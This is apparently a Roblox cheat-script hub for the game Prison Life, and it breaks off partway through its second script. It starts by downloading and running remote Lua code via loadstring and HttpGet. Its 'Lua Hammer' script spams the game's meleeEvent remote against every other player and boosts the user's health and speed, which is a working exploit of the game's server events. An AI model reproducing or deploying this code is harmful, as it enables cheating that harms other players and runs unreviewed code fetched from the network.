local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/main/Center%20Regginator%20UILib"))()
local GUI = Mercury:Create{
    Name = "Center V4",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Dark,
    Link = "https://admin.regginator.hub/proyects/lua/luac/Center-Regginator-Admin-V4/Prison-Life"
}
local Tab = GUI:Tab{
	Name = "Scripts",
	Icon = "rbxassetid://17109446821"
}
Tab:Button{
	Name = "Lua Hammer",
	Description = nil,
	Callback = function() local oc = oc or function(...) return ... end

function weld(p0,p1,c0,c1,par)
local w = Instance.new("Weld",p0 or par)
w.Part0 = p0
w.Part1 = p1
w.C0 = c0 or CFrame.new()
w.C1 = c1 or CFrame.new()
return w
end

function lerp(a, b, t)
    return a + (b - a)*t
end

do
        local function QuaternionFromCFrame(cf) local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() local trace = m00 + m11 + m22 if trace > 0 then local s = math.sqrt(1 + trace) local recip = 0.5/s return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 else local i = 0 if m11 > m00 then i = 1 end if m22 > (i == 0 and m00 or m11) then i = 2 end if i == 0 then local s = math.sqrt(m00-m11-m22+1) local recip = 0.5/s return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip elseif i == 1 then local s = math.sqrt(m11-m22-m00+1) local recip = 0.5/s return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip elseif i == 2 then local s = math.sqrt(m22-m00-m11+1) local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip end end end
         
        local function QuaternionToCFrame(px, py, pz, x, y, z, w) local xs, ys, zs = x + x, y + y, z + z local wx, wy, wz = w*xs, w*ys, w*zs local xx = x*xs local xy = x*ys local xz = x*zs local yy = y*ys local yz = y*zs local zz = z*zs return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) end
         
        local function QuaternionSlerp(a, b, t) local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] local startInterp, finishInterp; if cosTheta >= 0.0001 then if (1 - cosTheta) > 0.0001 then local theta = math.acos(cosTheta) local invSinTheta = 1/math.sin(theta) startInterp = math.sin((1-t)*theta)*invSinTheta finishInterp = math.sin(t*theta)*invSinTheta  else startInterp = 1-t finishInterp = t end else if (1+cosTheta) > 0.0001 then local theta = math.acos(-cosTheta) local invSinTheta = 1/math.sin(theta) startInterp = math.sin((t-1)*theta)*invSinTheta finishInterp = math.sin(t*theta)*invSinTheta else startInterp = t-1 finishInterp = t end end return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp        end

        function clerp(a,b,t)
                local qa = {QuaternionFromCFrame(a)}
                local qb = {QuaternionFromCFrame(b)}
                local ax, ay, az = a.x, a.y, a.z
                local bx, by, bz = b.x, b.y, b.z

                local _t = 1-t
                return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t))
        end
end
local his = {}

function ctween(tar,prop,c2,t,b)
        local function doIt()
        local now = tick()
        his[tar] = now
        local c1 = tar[prop]
        for i=1,t do
                if his[tar] ~= now then return end
                tar[prop] = clerp(c1,c2,1/t*i)
                wait(1/60)
        end
        end
        if b then coroutine.wrap(doIt)() else doIt() end
end

function tickwave(time,length,offset)
        return (math.abs((tick()+(offset or 0))%time-time/2)*2-time/2)/time/2*length
end

function playSound(id,parent,volume,pitch)
        local sound = Instance.new("Sound",parent or workspace)
        sound.SoundId = "http://www.roblox.com/asset?id="..id
        sound.Volume = volume or 1
        sound.Pitch = pitch or 1
        coroutine.wrap(function()
                wait()
                sound:Play()
                wait(10)
                sound:Stop()
                sound:Destroy()
        end)()
        return sound
end

local plr = game.Players.LocalPlayer
local char = plr.Character
local mouse = plr:GetMouse()

local nk = char.Torso.Neck
local nk0 = CFrame.new(0,1,0) * CFrame.Angles(-math.pi/2,0,math.pi)
local ra,la = char["Right Arm"], char["Left Arm"]
ra:BreakJoints()
la:BreakJoints()
local rs = weld(char.Torso,ra,CFrame.new(1.25,.5,0), CFrame.new(-.25,.5,0),stuff)
local ls = weld(char.Torso,la,CFrame.new(-1.25,.5,0), CFrame.new(.25,.5,0),stuff)
ls.Part1.FrontSurface = "Hinge"
rs.Part1.FrontSurface = "Hinge"
local rs0 = rs.C0
local ls0 = ls.C0

local color1 = BrickColor.new("Dark gray")
local color2 = BrickColor.new("Navy blue")

local stuff = Instance.new("Model",char)
pcall(function() char["Hammur"]:Destroy() end)
stuff.Name = "Hammur"
wait(.5)
local handle = Instance.new("Part")
handle.FormFactor = "Custom"
handle.BrickColor = color1
handle.Reflectance = .25
handle.Size = Vector3.new(.5,5,.5)
handle.TopSurface = "Smooth"
handle.BottomSurface = "Smooth"
handle.CanCollide = false
handle.Parent = stuff

local grip = weld(char["Right Arm"],handle,CFrame.new(0,-.95,0)*CFrame.Angles(math.rad(-90),0,0),CFrame.new(0,-1.4,0)) 
local grip0 = grip.C0
local hamend = handle:Clone()
Instance.new("BlockMesh",hamend)
hamend.Parent = stuff
hamend.Size = Vector3.new(2,2,3.5)
local hamwel = weld(handle,hamend,CFrame.new(0,3,0))
local hamsd1 = hamend:Clone()
hamsd1.Mesh.Scale = Vector3.new(1,1,1)
hamsd1.Parent = stuff
hamsd1.Size = Vector3.new(2.3,2.3,.3)
weld(hamend,hamsd1,CFrame.new(0,0,1.75))
local hamsd2 = hamsd1:Clone()
hamsd2.Parent = stuff
weld(hamend,hamsd2,CFrame.new(0,0,-1.75))
local hamp = hamsd1:Clone()
hamp.Parent = stuff
hamp.Size = Vector3.new(.2,.2,3.5)
weld(hamend,hamp,CFrame.new(.95,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,.95,0))
hamp = hamp:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Size = Vector3.new(.2,.2,2.5)
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,0,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,0,0))
hamp = handle:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Parent = stuff
hamp.Size = Vector3.new(.4,.2,.4)
Instance.new("CylinderMesh",hamp)
weld(hamend,hamp,CFrame.new(0,-.955,1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,-.955,-1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.955,1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.955,-1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,0,-1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,0,1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,0,-1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,0,1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.6,.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.6,.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.6,-.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.6,-.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,-.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,-.6,0) * CFrame.Angles(0,0,math.rad(90)))
local luacyl = hamp:Clone()
luacyl.BrickColor = BrickColor.Blue()
luacyl.Parent = stuff
luacyl.Mesh.Scale = Vector3.new(1,.2,1)
luacyl.Size = Vector3.new(2,.2,2)
weld(hamsd1,luacyl,CFrame.new(0,0,.14) * CFrame.Angles(math.rad(90),0,0))
hamp = luacyl:Clone()
hamp.BrickColor = BrickColor.White()
hamp.Parent = stuff
hamp.Size = Vector3.new(.7,.2,.7)
weld(luacyl,hamp,CFrame.new(.35,.01,-.35))
local luamoon = luacyl:Clone()
luamoon.Parent = stuff
luamoon.Size = Vector3.new(.7,.2,.7)
local mnw = weld(luacyl,luamoon,CFrame.new(1.2,.02,-1.2))
for r = 1,180,10 do
        local r2 = 2 * (math.pi/180*r)
        local l = hamsd1:Clone()
        l.Parent = stuff
        l.BrickColor = luacyl.BrickColor
        l.Size = Vector3.new(.3,.2,.2)
        l.Mesh.Scale = Vector3.new(1,.3,.3)
        weld(luacyl,l,CFrame.new(Vector3.new(math.sin(r2)*1.7,0,math.cos(r2)*1.7),Vector3.new()))
end
hamp = hamend:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Size = Vector3.new(.2,.2,3.5)
hamp.Mesh.Scale = Vector3.new(.25,.25,1)
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-1.05,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(1.05,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(1.05,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,-1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-1.05,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,-1.05,0))
for x = -1,1 do
for y = -1,1 do
hamp = hamp:Clone()
hamp.Mesh.Scale = Vector3.new(1,1,1)
hamp.Size = Vector3.new(.5,.5,.2)
hamp.Parent = stuff
weld(hamsd2,hamp,CFrame.new(x*.7,y*.7,-.1))
end
end

rs.C0 = rs0 * CFrame.Angles(math.rad(70),math.rad(50),math.rad(-20))
ls.C0 = ls0 * CFrame.new(.4,.2,-.3) * CFrame.Angles(math.rad(110),math.rad(0),math.rad(00)) * CFrame.Angles(0,math.rad(60),0)

function endScript()
        pcall(function() runcon:disconnect() end)
        pcall(function() kdcon:disconnect() end)
        pcall(function() kucon:disconnect() end)
        pcall(game.Destroy,stuff)
        pcall(game.Destroy,bg)
        pcall(game.Destroy,bv)
end

local spintime = 3
local idling = true

runcon = game:GetService("RunService").Stepped:connect(oc(function()
        if not stuff:IsDescendantOf(workspace) then
                endScript()
        end
        local an = (tick()%spintime)*360/spintime
        mnw.C0 = CFrame.Angles(0,math.rad(an),0) * CFrame.new(0,.04,1.7)
        if idling then
                rs.C0 = clerp(rs.C0,rs0 * CFrame.Angles(math.rad(70+tickwave(3,5)),math.rad(50),math.rad(-20)),.4)
                ls.C0 = clerp(ls.C0,ls0 * CFrame.new(.4,.2,-.3) * CFrame.Angles(math.rad(115+tickwave(3,5)),math.rad(0),math.rad(-5)) * CFrame.Angles(0,math.rad(60),0),.4)
                nk.C0 = clerp(nk.C0,nk0 * CFrame.Angles(tickwave(4,-.1),0,0),.4)
                grip.C0 = clerp(grip.C0,grip0,.4)
        end
end))

function cfot(tar,cf,t)
        coroutine.wrap(function()
                for i=1,t do
                        tar.CFrame = tar.CFrame * cf
                        wait(1/30)
                end
        end)()
end

function DoDamage(hum,dmg)
        if hum.Health == 0 then   for i, plr in pairs(game.Players:GetChildren()) do
                        if plr.Name ~= game.Players.LocalPlayer.Name then
                        for i = 1, 10 do
                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                        end
        end
end return end
        local a,b = ypcall(function()
                --hum:TakeDamage(dmg)
                hum.Health = hum.Health - dmg
                if not hum.Parent:FindFirstChild("Torso") then return end
                local m = Instance.new("Model",workspace)
                m.Name = -dmg
                local h = Instance.new("Humanoid",m)
                h.MaxHealth = 0
                local p = Instance.new("Part",m)
                p.Name = "Head"
                p.FormFactor = "Custom"
                p.Size = Vector3.new(.2,.2,.2)
                p.Transparency = 0.97
                p.CanCollide = false
                p.Anchored = true
                p:BreakJoints()
                game.Debris:AddItem(m,5)
                p.CFrame = CFrame.new(hum.Parent.Torso.Position) * CFrame.new(math.random(-2,2),2.5,math.random(-2,2))
                local rAm = math.random(3,6)/100
                coroutine.wrap(function()
                for i=1,300 do 
                p.CFrame = p.CFrame * CFrame.new(0,rAm,0) 
                wait()
                end 
                p:Destroy()
                end)()
        end)
        if not a then print(b) end
end

local atdeb = false
local basiccombo = 0
local basiccombotimer = 0
bg = Instance.new("BodyGyro",char.Torso)
bg.maxTorque = Vector3.new(1,0,1)*9e10
bg.P = 10000
bg.D = 500
bv = Instance.new("BodyVelocity",char.Torso)
bv.maxForce = Vector3.new()
bv.P = 50000

kucon = mouse.KeyUp:connect(oc(function(k)
        if k == "0" and sprint then
                pcall(function() char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed / 1.5 end)
                sprint = false
        end
end))

kdcon = mouse.KeyDown:connect(oc(function(k)
        if k == "0" and not sprint then
                pcall(function() char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed * 1.5 end)
                sprint = true
        end
        if k == "f" then
                if atdeb then return end
                atdeb = true
                idling = false
                playSound(105374058,hamend,1,1)
             ---   bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
               -- ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-20),0,0),7,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(-90)),7)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(30)),13,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-35),0,0),13,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(60)),13)
                playSound(92597296,hamend,1,1.07)
                local s = playSound(96626016,hamend)
                s.Volume = 0
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        s.Volume = 1
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-20
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,30)
                                hum.PlatformStand = true
                                wait(.6)
                                hum.PlatformStand = false
                        end
                end)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(35),math.rad(0),math.rad(30)),4,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(35),0,0),4,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(35),math.rad(0),math.rad(-30)),4)
                if workspace:FindPartOnRay(Ray.new(hamend.Position,hamend.CFrame.lookVector*3),char) then
                        s.Volume = 1
                end
                wait(.2)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                hitcon:disconnect()
                atdeb = false
                idling = true
        end
        if k == "q" then
                if atdeb then return end
                atdeb = true
                idling = false
                playSound(105374058,hamend,1,1)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
                ctween(grip,"C0",grip0*CFrame.Angles(math.rad(-30),math.rad(-25),math.rad(-15)),9,true)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(30)),7,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-20),0,0),7,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(-30)),7)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(30)),13,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-35),0,0),13,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(-30)),13)
                playSound(92597296,hamend,1,1.07)
                local s = playSound(96626016,hamend)
                s.Volume = 0
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        s.Volume = 1
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-20
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,30)
                                hum.PlatformStand = true
                                wait(.6)
                                hum.PlatformStand = false
                        end
                end)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
                wait(.05)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(-20),0,0)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(55),math.rad(5),math.rad(50)),7,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(5),0,0),4,true)
                ctween(rs,"C0",rs0*CFrame.new(-.9,0,-.9) * CFrame.Angles(math.rad(50),math.rad(5),math.rad(-50)),7)
                if workspace:FindPartOnRay(Ray.new(hamend.Position,hamend.CFrame.lookVector*3),char) then
                        s.Volume = 1
                end
                wait(.2)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                hitcon:disconnect()
                atdeb = false
                idling = true
        end
        if k == "r" then
                if atdeb then return end
                atdeb = true
                idling = false
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(70),math.rad(0),math.rad(30)),7,true)
                ctween(grip,"C0",grip0*CFrame.Angles(math.rad(0),math.rad(90),math.rad(-60))*CFrame.Angles(0,math.rad(180),0),9,true)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                bg.cframe = char.Torso.CFrame
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(70),math.rad(0),math.rad(-30)),7,true)
                local s = playSound(92597296,hamend,1,1.07)
                s.Looped = true
                local sndmd = {}
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        if not sndmd[hit] then sndmd[hit] = playSound(10730819,hamend) end
                        
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*60
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,math.random(4,6))
                                hum.Sit = true
                                wait(2)
                                hum.Sit = false
                        end
                end)
                for i=1,20 do
                        bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(-1440/20),0)
                        wait(.1)
                end
                hitcon:disconnect()
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                s:Stop()
                s:Destroy()
                atdeb = false
                idling = true
        end
        if k == "e" then
                if atdeb then return end
                basiccombo = (tick()-basiccombotimer > .5 or basiccombo == 2) and 1 or basiccombo + 1
                idling = false
                atdeb = true
                if basiccombo == 1 then
                        ctween(ls,"C0",ls0 * CFrame.new(.2,.2,-.1) * CFrame.Angles(math.rad(120),math.rad(0),math.rad(5)) * CFrame.Angles(0,math.rad(60),0),7,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,-.3) * CFrame.Angles(math.rad(120),math.rad(70),math.rad(-30)),7)
                        bg.maxTorque = Vector3.new(1,1,1)*9e10
                        bg.cframe = char.Torso.CFrame * CFrame.Angles(0,math.rad(-40),0)
                        playSound(92597296,hamend,1,1.2)
                        local ac
                        local hitcon
                        hitcon = hamend.Touched:connect(function(hit)
                                if not ac then ac = playSound(10730819,hamend,1,1) end
                                if not hit.Anchored then
                                        hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*50
                                end
                                local hum = hit.Parent:FindFirstChild("Humanoid")
                                if hum and not hum:IsDescendantOf(char) then
                                        DoDamage(hum,10)
                                end
                        end)
                        ctween(ls,"C0",ls0 * CFrame.new(1,.2,-1) * CFrame.Angles(math.rad(115),math.rad(0),math.rad(40)) * CFrame.Angles(0,math.rad(60),0),6,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,-.3) * CFrame.Angles(math.rad(120),math.rad(80),math.rad(-30))* CFrame.Angles(math.rad(-50),0,0),6,true)
                        wait(.1)
                        bg.cframe = char.Torso.CFrame * CFrame.Angles(0,math.rad(40),0)
                        hitcon:disconnect()
                elseif basiccombo == 2 then
                        ctween(ls,"C0",ls0*CFrame.new(1,0,-1) * CFrame.Angles(math.rad(5),math.rad(0),math.rad(70)),10,true)
                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(10),0,0),12,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,0) * CFrame.Angles(math.rad(-5),math.rad(0),math.rad(0)),10,true)
                        wait(.2)
                        playSound(92597296,hamend,1,.7)
                        wait(.1)
                        bg.maxTorque = Vector3.new(1,1,1)*9e10
                        bg.cframe = char.Torso.CFrame
                        bv.maxForce = Vector3.new(1,0,1)*9e5
                        bv.velocity = bg.cframe.lookVector * 70
                        coroutine.wrap(function() for i=1,25 do bv.velocity = bv.velocity*.9 wait(1/30) end bv.maxForce = Vector3.new() end)()
                        local thrustcon
                        thrustcon = hamend.Touched:connect(function(hit)
                                if not hit.Anchored then
                                        hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-40
                                end
                                local hum = hit.Parent:FindFirstChild("Humanoid")
                                if hum and not hum:IsDescendantOf(char) then
                                        DoDamage(hum,5)
                                        --thrustcon:disconnect()
                                        hum.Sit = true
                                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(30),0,0),5,true)
                                        if not ac then ac = playSound(92597296,hamend,1,1.15) end
                                        local tor = hum.Parent:FindFirstChild("Torso")
                                        if tor and not tor:FindFirstChild("torv") then
                                                --tor.Velocity = bg.cframe.lookVector*30 + Vector3.new(0,100,0)
                                                local torv = Instance.new("BodyVelocity",tor)
                                                torv.maxForce = Vector3.new(1,1,1)*9e9
                                                torv.P = 2000
                                                torv.velocity = bg.cframe.lookVector*20 + Vector3.new(0,120,0)
                                                torv.Name = "torv"
                                                local torav = Instance.new("BodyAngularVelocity",tor)
                                                torav.maxTorque = Vector3.new(1,1,1)*9e9
                                                torav.P = 5000
                                                torav.angularvelocity = Vector3.new(math.random()-.5,math.random()-.5,math.random()-.5)*2
                                                coroutine.wrap(function() 
                                                        for i=1,torv.velocity.Y/196.22*30 do
                                                                hum.Sit = true
                                                                torv.velocity = torv.velocity - Vector3.new(0,196.22/30,0) 
                                                                wait(1/30) 
                                                        end 
                                                        torv:Destroy() 
                                                        torav:Destroy()
                                                        tor.Velocity = Vector3.new()
                                                end)()
                                        end
                                end
                        end)
                        ctween(ls,"C0",ls0*CFrame.new(1,0,-1) * CFrame.Angles(math.rad(80),math.rad(0),math.rad(50)),12,true)
                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(-70),0,0),12,true)
                        ctween(rs,"C0",rs0*CFrame.new(-.6,0,-.7) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(-10)),12,true)
                        Delay(.3,function() thrustcon:disconnect() end)
                        
                end
                wait(.1)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                
                basiccombotimer = tick()
                atdeb = false
                idling = true
                
        end -- 96626016, 92597296
        bg.cframe = CFrame.new(char.Torso.Position,char.Torso.Position+char.Torso.CFrame.lookVector*Vector3.new(1,0,1))
end))

char.Humanoid.MaxHealth = 220
char.Humanoid.WalkSpeed = 20
wait(.3)
char.Humanoid.Health = 220 end
}
Tab:Button{
	Name = "Neon Green Sword",
	Description = nil,
	Callback = function() Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

    Player=game:GetService('Players').LocalPlayer
    Character=Player.Character
    Mouse=Player:GetMouse()
    m=Instance.new('Model',Character)


    local function weldBetween(a, b)
        local weldd = Instance.new("ManualWeld")
        weldd.Part0 = a
        weldd.Part1 = b
        weldd.C0 = CFrame.new()
        weldd.C1 = b.CFrame:inverse() * a.CFrame
        weldd.Parent = a
        return weldd
    end
    
    it=Instance.new
    
    function nooutline(part)
        part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
    end
    
    function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
        local fp=it("Part")
        fp.formFactor=formfactor
        fp.Parent=parent
        fp.Reflectance=reflectance
        fp.Transparency=transparency
        fp.CanCollide=false
        fp.Locked=true
        fp.BrickColor=BrickColor.new(tostring(brickcolor))
        fp.Name=name
        fp.Size=size
        fp.Position=Character.Torso.Position
        nooutline(fp)
        fp.Material=material
        fp:BreakJoints()
        return fp
    end
    
    function mesh(Mesh,part,meshtype,meshid,offset,scale)
        local mesh=it(Mesh)
        mesh.Parent=part
        if Mesh=="SpecialMesh" then
            mesh.MeshType=meshtype
            mesh.MeshId=meshid
        end
        mesh.Offset=offset
        mesh.Scale=scale
        return mesh
    end
    
    function weld(parent,part0,part1,c0,c1)
        local weld=it("Weld")
        weld.Parent=parent
        weld.Part0=part0
        weld.Part1=part1
        weld.C0=c0
        weld.C1=c1
        return weld
    end

handle=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Handle",Vector3.new(0.325260222, 0.487890393, 0.325260192))
handleweld=weld(m,Character["Right Arm"],handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(1.00006843, -0.11853981, 0.100028992, 0, 0.999999881, 0, 0, 0, -1, -1, 0, 0))
mesh("CylinderMesh",handle,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
